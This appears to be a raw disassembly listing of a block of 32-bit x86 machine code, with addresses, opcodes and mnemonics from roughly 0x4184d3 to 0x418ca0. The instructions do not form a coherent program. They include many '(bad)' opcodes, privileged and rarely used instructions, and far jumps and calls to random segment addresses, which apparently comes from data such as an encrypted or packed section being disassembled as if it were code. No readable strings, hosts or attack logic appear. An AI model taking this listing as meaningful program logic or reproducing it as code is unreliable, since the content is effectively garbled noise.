  4184d3:	(bad)  
  4184d4:	popa   
  4184d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d6:	inc    eax
  4184d7:	pop    ecx
  4184d8:	mov    dh,BYTE PTR [edx]
  4184da:	xor    DWORD PTR [esp+ebp*8-0x54],ecx
  4184de:	not    dl
  4184e0:	pushf  
  4184e1:	into   
  4184e2:	icebp  
  4184e3:	inc    esi
  4184e4:	imul   DWORD PTR [eax-0x47891d8a]
  4184ea:	xchg   ecx,eax
  4184eb:	cmp    esp,ebx
  4184ed:	daa    
  4184ee:	and    al,0xfa
  4184f0:	punpcklbw mm3,mm4
  4184f3:	test   DWORD PTR [eax+0x7e],ebp
  4184f6:	mov    eax,0x3227f988
  4184fb:	xchg   esp,eax
  4184fc:	test   al,0x38
  4184fe:	(bad)  
  4184ff:	das    
  418500:	dec    ebx
  418501:	aas    
  418502:	mov    ecx,0x43acfafb
  418507:	mov    ch,0x4
  418509:	lock xchg edx,eax
  41850b:	sar    DWORD PTR ds:0x2570c7e2,1
  418511:	fsub   QWORD PTR [ecx+0x2c]
  418514:	iret   
  418515:	mov    al,0xf5
  418517:	inc    esp
  418518:	inc    ebx
  418519:	pop    ss
  41851a:	pop    edi
  41851b:	or     ebp,DWORD PTR [edx-0x18]
  41851e:	in     al,dx
  41851f:	dec    BYTE PTR [esi+0x6a]
  418522:	ror    BYTE PTR [ecx+0x22cfa32b],0x4f
  418529:	adc    cl,BYTE PTR [edx-0x2e4b47c4]
  41852f:	push   cs
  418530:	sub    eax,0xa8096c49
  418535:	dec    edi
  418536:	inc    esp
  418537:	idiv   ah
  418539:	daa    
  41853a:	sbb    ch,BYTE PTR [eax+0x6e182f18]
  418540:	call   0x8377078f
  418545:	xchg   DWORD PTR [edx-0x36],ebp
  418548:	xchg   esi,eax
  418549:	mov    dl,0x85
  41854b:	cmp    DWORD PTR [ebx],ebx
  41854d:	mov    dl,0xb8
  41854f:	jae    0x418576
  418551:	cmp    edi,DWORD PTR [eax+0x7c7fc4fa]
  418557:	test   eax,0x45dece4c
  41855c:	add    ebp,edx
  41855e:	(bad)
  418562:	push   edi
  418563:	jge    0x4185dc
  418565:	dec    ebp
  418566:	or     eax,0x89ad3f04
  41856b:	adc    DWORD PTR [eax+0x15028919],edx
  418571:	and    ecx,edi
  418573:	nop
  418574:	pop    es
  418575:	pop    eax
  418576:	and    bh,BYTE PTR [ebp-0x38]
  418579:	inc    edi
  41857a:	jecxz  0x4185bc
  41857c:	pop    ss
  41857d:	mov    ebp,DWORD PTR [ebx]
  41857f:	in     al,0xae
  418581:	pop    esp
  418582:	dec    edx
  418583:	mov    dh,BYTE PTR [ebx+0x1a84ba0a]
  418589:	retf   0x4e8e
  41858c:	sbb    DWORD PTR [esi],ebp
  41858e:	test   DWORD PTR [eax-0x42],0x4c747abd
  418595:	les    esi,FWORD PTR [edx+ecx*2+0x7]
  418599:	jmp    0x9da7:0xa6f1fa00
  4185a0:	retf   0x89ed
  4185a3:	sub    DWORD PTR [eax],eax
  4185a5:	lods   eax,DWORD PTR ds:[esi]
  4185a6:	test   eax,0x14f5f555
  4185ab:	add    al,BYTE PTR [ebx]
  4185ad:	call   0xce00:0x71161c81
  4185b4:	adc    BYTE PTR [ecx],bl
  4185b6:	pop    edi
  4185b7:	mov    ebp,DWORD PTR [edi]
  4185b9:	xchg   ebx,eax
  4185ba:	push   ds
  4185bb:	mov    esp,es
  4185bd:	dec    esp
  4185be:	inc    ecx
  4185bf:	and    eax,ebp
  4185c1:	and    al,0xee
  4185c3:	dec    esp
  4185c4:	loope  0x41859f
  4185c6:	ret    0x6b22
  4185c9:	cs retf 0xfb7d
  4185cd:	sub    al,0xbd
  4185cf:	xchg   ebx,eax
  4185d0:	(bad)  
  4185d1:	jg     0x4185cb
  4185d3:	jne    0x41855c
  4185d5:	call   0x2f75:0xaeb33664
  4185dc:	adc    ebx,edx
  4185de:	retf   0x71e8
  4185e1:	in     eax,dx
  4185e2:	leave  
  4185e3:	xlat   BYTE PTR ds:[ebx]
  4185e4:	std    
  4185e5:	jae    0x418599
  4185e7:	aad    0xb2
  4185e9:	retf   0x10ee
  4185ec:	rcl    ch,0x94
  4185ef:	retf   
  4185f0:	mov    ch,0xaa
  4185f2:	popa   
  4185f3:	mov    edi,0x5db8515c
  4185f8:	lahf   
  4185f9:	repz sahf 
  4185fb:	cmp    BYTE PTR [eax+0x31],dl
  4185fe:	pop    ecx
  4185ff:	dec    esi
  418600:	or     bh,BYTE PTR [ebx+0x6b51e85d]
  418606:	xchg   ebx,eax
  418607:	sub    ebp,ebx
  418609:	scas   al,BYTE PTR es:[edi]
  41860a:	aam    0x22
  41860c:	mov    dh,0x4
  41860e:	pop    esi
  41860f:	sub    ah,bh
  418611:	inc    ecx
  418612:	sbb    edx,edx
  418614:	push   ebx
  418615:	xor    bl,ch
  418617:	jns    0x41859e
  418619:	xchg   ebp,eax
  41861a:	dec    esi
  41861b:	jg     0x418656
  41861d:	and    edi,edx
  41861f:	mov    cl,0x26
  418621:	(bad)  
  418622:	out    0xcc,eax
  418624:	call   0x7ea:0x4162e556
  41862b:	cmc    
  41862c:	jg     0x418681
  41862e:	sub    al,0xe7
  418630:	sbb    eax,0x18bf11d5
  418635:	scas   eax,DWORD PTR es:[edi]
  418636:	xchg   esi,eax
  418637:	clc    
  418638:	sub    ebp,DWORD PTR [ecx+0x288fb9d3]
  41863e:	jne    0x4185c8
  418640:	sbb    eax,0xf1f4c9da
  418645:	jnp    0x4185c9
  418647:	ins    DWORD PTR es:[edi],dx
  418648:	int    0x9d
  41864a:	xor    ah,BYTE PTR [ebx]
  41864c:	mov    cl,0x42
  41864e:	(bad)  
  41864f:	or     bl,BYTE PTR [eax+0x47]
  418652:	push   cs
  418653:	adc    ecx,DWORD PTR [ebx+0x4d212831]
  418659:	in     eax,dx
  41865a:	jp     0x418683
  41865c:	pop    edx
  41865d:	or     dl,bl
  41865f:	in     al,dx
  418660:	daa    
  418661:	(bad)  
  418662:	stos   BYTE PTR es:[edi],al
  418663:	ja     0x418699
  418665:	pop    esp
  418666:	icebp  
  418667:	xchg   ebx,eax
  418668:	ret    0x7196
  41866b:	or     ch,bl
  41866d:	push   ebx
  41866e:	or     al,0xb2
  418670:	dec    ebp
  418671:	jbe    0x4186ce
  418673:	dec    esp
  418674:	jmp    0x418625
  418676:	push   0x51
  418678:	or     eax,0x65662e8d
  41867d:	std    
  41867e:	jae    0x4186b0
  418680:	push   edx
  418681:	cmp    BYTE PTR [edi],dh
  418683:	ja     0x4186f8
  418685:	les    edi,FWORD PTR [eax-0x7f]
  418688:	enter  0xe197,0xa8
  41868c:	sahf   
  41868d:	test   DWORD PTR [ebp+0x4],0xa7fade58
  418694:	mov    ds:0x84a8d399,al
  418699:	shr    BYTE PTR [ecx],1
  41869b:	out    dx,al
  41869c:	pop    ds
  41869d:	or     dl,BYTE PTR [eax]
  41869f:	mov    edi,0x49086fe1
  4186a4:	xchg   BYTE PTR [edx-0x2ddbc2f1],dl
  4186aa:	or     DWORD PTR [ebx+0x5e],edi
  4186ad:	(bad)  
  4186ae:	adc    bl,ah
  4186b0:	sub    bl,bh
  4186b2:	clc    
  4186b3:	sub    cl,bh
  4186b5:	mov    esp,DWORD PTR [edi]
  4186b7:	imul   esi,DWORD PTR [edi-0x7e8e381e],0xcc978207
  4186c1:	dec    edx
  4186c2:	push   cs
  4186c3:	daa    
  4186c4:	ss or  eax,0x324835a1
  4186ca:	push   es
  4186cb:	inc    edi
  4186cc:	loop   0x41865f
  4186ce:	mov    ds:0x655abe61,al
  4186d3:	fs les ecx,FWORD PTR gs:[esi+0x165b542a]
  4186db:	mov    ebx,edx
  4186dd:	inc    esi
  4186de:	cmp    al,0x95
  4186e0:	xor    al,0xf1
  4186e2:	pop    edx
  4186e3:	sbb    eax,0xf0086269
  4186e8:	push   cs
  4186e9:	int3   
  4186ea:	mov    esp,0x9c79363e
  4186ef:	xor    esi,DWORD PTR [ebx+0x3e]
  4186f2:	push   ecx
  4186f3:	push   edi
  4186f4:	int    0x53
  4186f6:	push   esi
  4186f7:	jae    0x418761
  4186f9:	jne    0x4186ed
  4186fb:	xlat   BYTE PTR ds:[ebx]
  4186fc:	loope  0x41872f
  4186fe:	xor    DWORD PTR [eax],edx
  418700:	aas    
  418701:	out    0xf,eax
  418703:	or     al,BYTE PTR [ebx]
  418705:	jmp    0x2a9693c9
  41870a:	outs   dx,BYTE PTR ds:[esi]
  41870b:	push   cs
  41870c:	mov    ch,0x5f
  41870e:	es ss add al,0x82
  418712:	icebp  
  418713:	mov    eax,DWORD PTR [esi]
  418715:	jns    0x41874e
  418717:	cdq    
  418718:	xor    bh,BYTE PTR [edi-0x2b796369]
  41871e:	xchg   ebx,eax
  41871f:	out    dx,eax
  418720:	mov    bh,0xa9
  418722:	sub    al,al
  418724:	xor    eax,0x8599273e
  418729:	push   ds
  41872a:	gs inc eax
  41872c:	inc    edx
  41872d:	xchg   edx,eax
  41872e:	dec    esi
  41872f:	jmp    0x418764
  418731:	ret    0x639c
  418734:	jle    0x418783
  418736:	scas   al,BYTE PTR es:[edi]
  418737:	cmp    al,0xd5
  418739:	sub    edi,esp
  41873b:	sti    
  41873c:	push   edx
  41873d:	inc    edi
  41873e:	ficomp WORD PTR [ecx+0x38]
  418741:	fidiv  WORD PTR [ebp-0x2d]
  418744:	inc    ebx
  418745:	arpl   WORD PTR fs:[edx-0x13],cx
  418749:	cmc    
  41874a:	mov    ebx,0x3dfa1286
  41874f:	in     eax,dx
  418750:	xor    dh,BYTE PTR [ecx+0x3]
  418753:	js     0x418768
  418755:	shl    DWORD PTR [eax-0x4c4147d4],0x66
  41875c:	dec    edx
  41875d:	jae    0x41873c
  41875f:	sub    esp,esi
  418761:	jecxz  0x4186f3
  418763:	fcom   QWORD PTR [edx-0xbedc609]
  418769:	jbe    0x418754
  41876b:	jg     0x41875a
  41876d:	inc    esi
  41876e:	in     al,dx
  41876f:	(bad)  
  418770:	(bad)  
  418771:	repnz inc esi
  418773:	in     al,dx
  418774:	imul   eax,DWORD PTR [edi],0xffffffd8
  418777:	push   edx
  418778:	ret    0x2b01
  41877b:	xchg   edx,eax
  41877c:	cli    
  41877d:	aam    0xff
  41877f:	test   ch,ch
  418781:	mov    al,ds:0x4f886bc4
  418786:	mov    ch,0x65
  418788:	add    eax,0x9443b35c
  41878d:	frstor [eax-0x5492374c]
  418793:	popf   
  418794:	sub    ebx,edi
  418796:	in     eax,dx
  418797:	fdiv   QWORD PTR [eax+ebp*1-0x65bd8001]
  41879e:	out    dx,eax
  41879f:	(bad)  [ebx]
  4187a1:	nop
  4187a2:	pop    esp
  4187a3:	sti    
  4187a4:	(bad)  
  4187a5:	and    ebp,edi
  4187a7:	xchg   esi,eax
  4187a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a9:	and    al,0xa5
  4187ab:	retf   0x1b50
  4187ae:	cld    
  4187af:	or     eax,0x5673c268
  4187b4:	jmp    0x97ba779a
  4187b9:	inc    esp
  4187ba:	add    bl,BYTE PTR [ecx-0x37]
  4187bd:	popf   
  4187be:	aas    
  4187bf:	xchg   edi,eax
  4187c0:	mov    edi,0x4fadf481
  4187c5:	push   0xffffff81
  4187c7:	cmc    
  4187c8:	inc    ecx
  4187c9:	(bad)  
  4187ca:	jns    0x418847
  4187cc:	jle    0x4187f0
  4187ce:	je     0x418777
  4187d0:	dec    ebx
  4187d1:	lea    edi,[esi+ecx*2]
  4187d4:	mov    esi,esp
  4187d6:	push   edi
  4187d7:	stos   DWORD PTR es:[edi],eax
  4187d8:	inc    ecx
  4187d9:	ficomp WORD PTR [edx-0x63]
  4187dc:	mov    BYTE PTR [esi-0x18453406],bl
  4187e2:	add    DWORD PTR [ebp-0x1ac99fd6],0x2917de62
  4187ec:	or     ebp,DWORD PTR [eax+0x13]
  4187ef:	add    al,dl
  4187f1:	cmp    DWORD PTR [edx+0x77162b41],eax
  4187f7:	add    BYTE PTR [edx+0x27],al
  4187fa:	add    esi,DWORD PTR [ebx-0x7157a888]
  418800:	pop    ss
  418801:	mov    al,0x5c
  418803:	stos   DWORD PTR es:[edi],eax
  418804:	fsubr  st,st(1)
  418806:	mov    ds:0xeda7c98a,al
  41880b:	mov    edx,0xc8a164cb
  418810:	std    
  418811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418812:	in     al,dx
  418813:	dec    esp
  418814:	jge    0x4187c7
  418816:	out    0x19,al
  418818:	xchg   esp,eax
  418819:	dec    ebx
  41881a:	ins    BYTE PTR es:[edi],dx
  41881b:	xchg   ebp,eax
  41881c:	fist   DWORD PTR [esi]
  41881e:	lock ja 0x418823
  418821:	in     eax,0xae
  418823:	(bad)  
  418824:	jmp    0x7971:0x3cd73f5b
  41882b:	fs fs ss cmp cl,al
  418830:	js     0x4187e2
  418832:	imul   edx,DWORD PTR [ecx+0x6b4cd1fb],0x37
  418839:	push   edi
  41883a:	dec    ecx
  41883b:	dec    ebp
  41883c:	or     eax,DWORD PTR [edx-0x14e69ee0]
  418842:	or     BYTE PTR ds:0x91d7b3,bh
  418848:	and    al,0xd3
  41884a:	xor    eax,DWORD PTR [edi-0x9037e72]
  418850:	jbe    0x418813
  418852:	pop    edi
  418853:	push   esp
  418854:	adc    eax,0x24602307
  418859:	mov    eax,0xff77be2d
  41885e:	push   edx
  41885f:	fsubr  QWORD PTR [esi+0x18f415aa]
  418865:	add    al,0x2b
  418867:	cmp    al,0x21
  418869:	sti    
  41886a:	mov    ds:0xf45eab5e,eax
  41886f:	aad    0xba
  418871:	loop   0x418877
  418873:	mov    bl,0x47
  418875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418876:	repnz test BYTE PTR [ecx-0x2c],0xa0
  41887b:	or     al,0xca
  41887d:	aaa    
  41887e:	cmp    DWORD PTR [ebp+0x63db2380],esp
  418884:	xchg   DWORD PTR [ebp-0x7213522c],ebx
  41888a:	sub    ah,dh
  41888c:	sti    
  41888d:	fcomp  QWORD PTR [edx]
  41888f:	out    0x36,al
  418891:	es inc edi
  418893:	sub    BYTE PTR [ecx],ch
  418895:	mov    ds:0x9e03402d,al
  41889a:	lea    ecx,[edx]
  41889c:	shl    BYTE PTR [ebp-0x2b],1
  41889f:	pop    ebp
  4188a0:	mov    bl,0xd9
  4188a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a3:	fwait
  4188a4:	sbb    ah,BYTE PTR cs:0x9c83fcb9
  4188ab:	mov    dl,0xeb
  4188ad:	sti    
  4188ae:	xchg   edx,eax
  4188af:	cmp    DWORD PTR [ecx],0xf35ffe60
  4188b5:	mov    edx,0x2ed36f4b
  4188ba:	push   edi
  4188bb:	js     0x4188db
  4188bd:	gs scas eax,DWORD PTR es:[edi]
  4188bf:	jmp    0x4188b2
  4188c1:	call   0xb974:0x7e5aaefd
  4188c8:	xchg   ebx,eax
  4188c9:	push   eax
  4188ca:	pop    esi
  4188cb:	das    
  4188cc:	mov    bh,0x8b
  4188ce:	scas   al,BYTE PTR es:[edi]
  4188cf:	jecxz  0x41889b
  4188d1:	add    al,0xc3
  4188d3:	jo     0x41891c
  4188d5:	add    dh,BYTE PTR [ebp-0x15197adb]
  4188db:	(bad)  [eax-0x282d4fd]
  4188e1:	inc    ebp
  4188e2:	fild   WORD PTR [edx-0xe7144f9]
  4188e8:	(bad)  
  4188ea:	push   0x6
  4188ec:	add    eax,0x12325c46
  4188f1:	adc    dh,BYTE PTR [edx+ebp*8+0x4ae0262d]
  4188f8:	faddp  st(4),st
  4188fa:	aaa    
  4188fb:	lds    edx,FWORD PTR [edx+0xee5ad9e]
  418901:	or     al,0xcb
  418903:	test   BYTE PTR [esi-0x3a],cl
  418906:	sti    
  418907:	lock pop ds
  418909:	mov    ebx,0x8239404e
  41890e:	popa   
  41890f:	into   
  418910:	into   
  418911:	mov    ch,0x5
  418913:	stc    
  418914:	or     DWORD PTR [edx+0x1d305d8c],esp
  41891a:	xor    DWORD PTR [ecx],esi
  41891c:	fs or  al,0x38
  41891f:	push   0xf661da33
  418924:	xor    eax,0x2c7ef356
  418929:	rcr    BYTE PTR [esi+0x7d71cca],0xc1
  418930:	pop    edi
  418931:	cli    
  418932:	mov    ah,BYTE PTR [edx]
  418934:	mul    DWORD PTR [edx-0x62]
  418937:	lods   al,BYTE PTR ds:[esi]
  418938:	mov    cl,0xeb
  41893a:	push   ecx
  41893b:	retf   
  41893c:	pop    ecx
  41893d:	les    eax,FWORD PTR [edi-0x31]
  418940:	lods   al,BYTE PTR ds:[esi]
  418941:	stc    
  418942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418943:	(bad)  
  418944:	iret   
  418945:	mov    ch,0x51
  418947:	ffreep st(4)
  418949:	scas   eax,DWORD PTR es:[edi]
  41894a:	stos   BYTE PTR es:[edi],al
  41894b:	fisttp DWORD PTR [ebp-0x728f70b2]
  418951:	aas    
  418952:	mov    ebx,0x38b61314
  418957:	addr16 repnz popf 
  41895a:	sti    
  41895b:	ds push esp
  41895d:	cs mov ebp,0x717ca0b
  418963:	aam    0x9f
  418965:	mov    ecx,0x141fd729
  41896a:	call   0xc661:0x2a494406
  418971:	push   ebx
  418972:	rcl    BYTE PTR [ebx],0x76
  418975:	cmp    ebp,DWORD PTR [esi]
  418977:	xchg   ebp,eax
  418978:	jnp    0x418937
  41897a:	mov    bl,0x7
  41897c:	mov    bl,0x7e
  41897e:	and    DWORD PTR [edi-0x3f050b1a],ebx
  418984:	dec    ecx
  418985:	lods   al,BYTE PTR ds:[esi]
  418986:	xchg   ebx,eax
  418987:	nop
  418988:	xchg   esi,eax
  418989:	cmp    esi,DWORD PTR [ebp+edi*2-0x3d]
  41898d:	xchg   esi,eax
  41898e:	ds pop es
  418990:	push   0xffffffc2
  418992:	in     eax,dx
  418993:	jl     0x41892b
  418995:	cmp    BYTE PTR [edi-0x29887cd1],ah
  41899b:	ret    0xeb80
  41899e:	mov    esi,0x62c7fcf8
  4189a3:	lea    eax,[eax+esi*2-0x35e8163c]
  4189aa:	sub    DWORD PTR [eax+0x7d],edx
  4189ad:	adc    dh,BYTE PTR [eax+0x656a734b]
  4189b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189b4:	std    
  4189b5:	inc    esp
  4189b6:	iret   
  4189b7:	(bad)  
  4189b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b9:	xchg   ecx,eax
  4189ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189bb:	cld    
  4189bc:	push   ebp
  4189bd:	scas   eax,DWORD PTR es:[edi]
  4189be:	pop    edi
  4189bf:	(bad)  
  4189c0:	lods   al,BYTE PTR ds:[esi]
  4189c1:	test   al,0xb6
  4189c3:	dec    eax
  4189c4:	and    dl,BYTE PTR [edi-0x24b48900]
  4189ca:	dec    ebp
  4189cb:	fdiv   QWORD PTR [eax+0x76]
  4189ce:	mov    edx,0x84a65850
  4189d3:	add    DWORD PTR [esi-0x22],esi
  4189d6:	adc    eax,0x3ed47512
  4189db:	mov    dh,0x20
  4189dd:	xchg   esi,eax
  4189de:	mov    edx,0xbcf4e5bd
  4189e3:	add    eax,ebp
  4189e5:	mov    bh,0x47
  4189e7:	add    eax,0x9e693de6
  4189ec:	dec    edx
  4189ed:	sub    eax,ebp
  4189ef:	jb     0x418a2a
  4189f1:	cli    
  4189f2:	loopne 0x418a32
  4189f4:	push   ebx
  4189f5:	or     bh,BYTE PTR es:[eax+0x21]
  4189f9:	popa   
  4189fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fb:	enter  0x6e20,0x28
  4189ff:	test   al,0xaf
  418a01:	sbb    cl,BYTE PTR [ebx+0x1a16b3e2]
  418a07:	add    BYTE PTR [edi],cl
  418a09:	hlt    
  418a0a:	jb     0x4189c5
  418a0c:	jge    0x418a32
  418a0e:	imul   esi,ebp,0xde7e6643
  418a14:	lods   al,BYTE PTR ds:[esi]
  418a15:	std    
  418a16:	mov    eax,ds:0x1229f71
  418a1b:	push   ss
  418a1c:	add    bl,al
  418a1e:	loope  0x418a15
  418a20:	or     DWORD PTR [edx],esi
  418a22:	daa    
  418a23:	adc    BYTE PTR [eax],0x78
  418a26:	xor    al,0xa8
  418a28:	cmp    cl,BYTE PTR [edx]
  418a2a:	push   cs
  418a2b:	imul   ebx,DWORD PTR [eax],0x51cd26b3
  418a31:	stos   BYTE PTR es:[edi],al
  418a32:	mov    edi,0x9fbbc85f
  418a37:	or     esi,ecx
  418a39:	mov    ds:0xfcd3628d,eax
  418a3e:	cmp    DWORD PTR [eax+eiz*1-0x46],ecx
  418a42:	xchg   BYTE PTR [ecx-0x383053af],bl
  418a48:	ss sub eax,0x221ab6d5
  418a4e:	push   edi
  418a4f:	xlat   BYTE PTR ds:[ebx]
  418a50:	int    0x3a
  418a52:	jo     0x418ab3
  418a54:	(bad)  
  418a55:	jae    0x418ac2
  418a57:	call   0xd98099fb
  418a5c:	frstor [edx+0x64]
  418a5f:	iret   
  418a60:	pop    ecx
  418a61:	mov    ds:0x1a12abbd,al
  418a66:	out    dx,eax
  418a67:	adc    al,0x4e
  418a69:	mov    bh,0x41
  418a6b:	xor    bl,BYTE PTR [ebx-0x3e]
  418a6e:	xchg   ecx,eax
  418a6f:	inc    esp
  418a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a71:	aam    0x51
  418a73:	inc    esp
  418a74:	sar    eax,cl
  418a76:	adc    eax,0x8792286
  418a7b:	inc    ebx
  418a7c:	xchg   ebp,eax
  418a7d:	lds    ebx,FWORD PTR [edi-0x75]
  418a80:	inc    ebx
  418a81:	push   es
  418a82:	lds    esp,FWORD PTR [edx]
  418a84:	imul   ecx,DWORD PTR [edi-0x79faf340],0x40478129
  418a8e:	bound  edi,QWORD PTR [edx-0x31]
  418a91:	mov    ch,0x22
  418a93:	add    BYTE PTR [eax+0x42329b24],ah
  418a99:	es cmp cl,al
  418a9c:	call   0xe5d7:0xf6834c6c
  418aa3:	xlat   BYTE PTR ds:[ebx]
  418aa4:	jp     0x418ad3
  418aa6:	add    al,0xbd
  418aa8:	adc    eax,0xa38650c2
  418aad:	adc    edi,DWORD PTR [edx+eax*8-0x54c267c7]
  418ab4:	and    DWORD PTR [esi+ebp*2+0x15],0xfffffff8
  418ab9:	xchg   esi,eax
  418aba:	dec    ebp
  418abb:	das    
  418abc:	sub    BYTE PTR [esi-0x2f],al
  418abf:	not    BYTE PTR [edx+0x3a]
  418ac2:	add    cl,BYTE PTR [eax+eiz*1]
  418ac5:	adc    BYTE PTR [edi-0x4],cl
  418ac8:	jg     0x418a60
  418aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418acb:	mov    fs,WORD PTR [eax-0x481300d5]
  418ad1:	mov    dh,0x3
  418ad3:	jmp    0xc9e78169
  418ad8:	(bad)
  418adb:	mov    ds:0x27be3df1,al
  418ae0:	call   0x2676:0xe427acd4
  418ae7:	pop    edx
  418ae8:	jnp    0x418a80
  418aea:	mov    al,ds:0xc5df2bc6
  418aef:	scas   al,BYTE PTR es:[edi]
  418af0:	dec    edi
  418af1:	cmp    al,0x4f
  418af3:	jno    0x418b13
  418af5:	in     eax,dx
  418af6:	idiv   DWORD PTR [esi]
  418af8:	mov    ch,0x8
  418afa:	in     al,dx
  418afb:	daa    
  418afc:	fidiv  DWORD PTR [esi]
  418afe:	fstp   QWORD PTR [edx]
  418b00:	daa    
  418b01:	inc    edi
  418b02:	imul   eax,DWORD PTR [edi],0x6072da92
  418b08:	ja     0x418aaa
  418b0a:	push   edi
  418b0b:	(bad)  
  418b0c:	ins    DWORD PTR es:[edi],dx
  418b0d:	fs jno 0x418ae0
  418b10:	jno    0x418b50
  418b12:	enter  0xe197,0xd7
  418b16:	mov    dh,0x85
  418b18:	test   eax,0xe2a17061
  418b1d:	and    eax,0x5ecc2a47
  418b22:	xor    eax,0x69b9f38a
  418b27:	sbb    eax,0x2dd72291
  418b2c:	rcl    BYTE PTR [edi-0x53],1
  418b2f:	out    0x51,eax
  418b31:	or     BYTE PTR [ebx],al
  418b33:	ret    0xf1a5
  418b36:	push   cs
  418b37:	vaddps ymm6,ymm4,YMMWORD PTR [ecx]
  418b3b:	mov    al,0x71
  418b3d:	jp     0x418af1
  418b3f:	syscall 
  418b41:	std    
  418b42:	inc    ecx
  418b43:	imul   esi,esi,0x36
  418b46:	pop    es
  418b47:	jne    0x418b99
  418b49:	and    BYTE PTR [eax+edx*4+0x5740c793],cl
  418b50:	push   ds
  418b51:	jge    0x418b6a
  418b53:	mov    esi,esi
  418b55:	icebp  
  418b56:	mov    ds:0x7f3a5b48,al
  418b5b:	popf   
  418b5c:	fcmovnbe st,st(5)
  418b5e:	(bad)  
  418b5f:	mov    al,0xb1
  418b61:	pop    ds
  418b62:	test   DWORD PTR [ebp+0x2a],esp
  418b65:	add    BYTE PTR [edx],ch
  418b67:	int    0xa3
  418b69:	xlat   BYTE PTR ds:[ebx]
  418b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b6b:	mov    eax,ds:0x3b4f5846
  418b70:	sub    edi,DWORD PTR [ecx-0x47]
  418b73:	mov    ds:0xc42ce93b,eax
  418b78:	mov    ds:0xa9b6a88a,eax
  418b7d:	mov    eax,0x235c91f7
  418b82:	hlt    
  418b83:	jecxz  0x418b57
  418b85:	pop    ebp
  418b86:	rcr    BYTE PTR [eax+0x70b5cd48],0x37
  418b8d:	nop
  418b8e:	adc    al,0x3c
  418b90:	mov    edx,0xa17c5639
  418b95:	or     DWORD PTR [esi+ebx*2+0x34],edx
  418b99:	fidivr WORD PTR [ebx+ebp*4-0xb1c35c3]
  418ba0:	(bad)  
  418ba1:	mov    ebx,0xf591e125
  418ba6:	add    esp,esi
  418ba8:	inc    esp
  418ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418baa:	add    DWORD PTR [ecx+edx*4+0x29],edx
  418bae:	scas   al,BYTE PTR es:[edi]
  418baf:	mov    ecx,0x6eea6abc
  418bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bb5:	stos   DWORD PTR es:[edi],eax
  418bb6:	xor    al,0x7
  418bb8:	jo     0x418c1e
  418bba:	xchg   edx,eax
  418bbb:	xor    ebx,DWORD PTR [ecx+edi*2+0x1f]
  418bbf:	push   0xdbbd3801
  418bc4:	xchg   ebp,eax
  418bc5:	(bad)  
  418bc6:	scas   al,BYTE PTR es:[edi]
  418bc7:	inc    esi
  418bc8:	or     BYTE PTR [edi],ah
  418bca:	mov    esi,0x235d817e
  418bcf:	pop    ecx
  418bd0:	xor    esp,edi
  418bd2:	mov    DWORD PTR [edx+0x7be7a625],edx
  418bd8:	xor    eax,DWORD PTR [ebx+ecx*2-0x7e]
  418bdc:	mov    edx,0x4a08bb0c
  418be1:	fsubr  st,st(1)
  418be3:	fdiv   DWORD PTR [ecx+0x13c4aeb2]
  418be9:	jae    0x418c08
  418beb:	fwait
  418bec:	or     edi,edx
  418bee:	sub    edi,esp
  418bf0:	fwait
  418bf1:	fs loope 0x418c6f
  418bf4:	add    BYTE PTR [eax],al
  418bf6:	ins    BYTE PTR es:[edi],dx
  418bf7:	fcomp  DWORD PTR [edi+ebp*4+0x29]
  418bfb:	pushf  
  418bfc:	cmp    edx,DWORD PTR [eax+0x39]
  418bff:	xor    edi,DWORD PTR cs:[ebp-0x33]
  418c03:	out    dx,al
  418c04:	call   0xd343:0x364d74f3
  418c0b:	sbb    ch,BYTE PTR [edi+0x73]
  418c0e:	daa    
  418c0f:	sbb    BYTE PTR [edx+0x6e650433],bh
  418c15:	jmp    0xd919:0xc945d96d
  418c1c:	cld    
  418c1d:	imul   ecx,DWORD PTR [eax],0x71
  418c20:	ds pop esp
  418c22:	data16 loope 0x418c58
  418c25:	fmul   DWORD PTR [ebx+0x3637085f]
  418c2b:	lods   al,BYTE PTR ds:[esi]
  418c2c:	mov    ebx,ebp
  418c2e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  418c30:	jecxz  0x418bca
  418c32:	stos   BYTE PTR es:[edi],al
  418c33:	cmp    eax,0x3b785cab
  418c38:	aam    0x6d
  418c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3b:	sbb    al,0xe
  418c3d:	mov    ebp,0xf8315521
  418c42:	sub    al,0xf8
  418c44:	xor    BYTE PTR [ecx],dl
  418c46:	popf   
  418c47:	jle    0x418c59
  418c49:	cmc    
  418c4a:	adc    al,0x1c
  418c4c:	sbb    eax,0x27355352
  418c51:	push   ebp
  418c52:	inc    edi
  418c53:	paddusb mm6,QWORD PTR [edx+ebx*4-0x10229ce0]
  418c5b:	cmp    eax,0xf637bed0
  418c60:	pop    es
  418c61:	cmp    DWORD PTR [edi+0x2c],0xffffffbe
  418c65:	(bad)
  418c69:	(bad)  
  418c6a:	out    0xac,al
  418c6c:	xchg   edx,eax
  418c6d:	jge    0x418ce5
  418c6f:	dec    edx
  418c70:	push   edi
  418c71:	mov    esi,DWORD PTR [edi-0x68b269ba]
  418c77:	(bad)
  418c7b:	mov    edx,0x4619318f
  418c80:	je     0x418c7f
  418c82:	dec    ebx
  418c83:	and    eax,0xe4cccc05
  418c88:	push   ebx
  418c89:	or     eax,0xbb9ade00
  418c8e:	ret    0xea94
  418c91:	adc    DWORD PTR [esp+edi*8-0x66],ecx
  418c95:	out    0xc6,eax
  418c97:	or     BYTE PTR [edi],0x41
  418c9a:	cld    
  418c9b:	rcl    cl,0x3d
  418c9e:	jo     0x418cbf
  418ca0:	ud2    
